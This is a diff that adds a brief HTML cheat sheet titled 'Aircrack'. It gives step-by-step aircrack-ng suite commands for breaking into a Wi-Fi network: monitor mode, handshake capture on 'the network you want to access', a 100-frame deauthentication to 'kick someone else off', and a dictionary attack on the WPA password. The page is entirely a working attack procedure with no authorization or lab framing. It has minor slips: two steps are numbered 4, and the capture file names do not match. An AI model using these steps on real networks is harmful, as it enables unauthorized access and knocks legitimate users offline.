@@ -1,0 +1,15 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Aircrack</title>
+</head><body>1. Start airmon-ng<br/>
+	airmon-ng start wlan0<br/>
+2. Run airodump<br/>
+	airodump-ng -i mon0<br/>
+3. Find the network you want to access<br/>
+	airodump-ng --bssid &lt;bssid&gt; -c 11 -w cowpatty mon0<br/>
+	wait for &quot;WPA handshake: ##:##:##:##:##:##&quot;<br/>
+4. Kick someone else off<br/>
+	aireplay-ng --deauth 100 -a &lt;bssid&gt; mon0<br/>
+4. Dictionary or other, crack the password<br/>
+	aircrack-ng WPAcrack.cap -w &lt;wordlist&gt;</body></html>
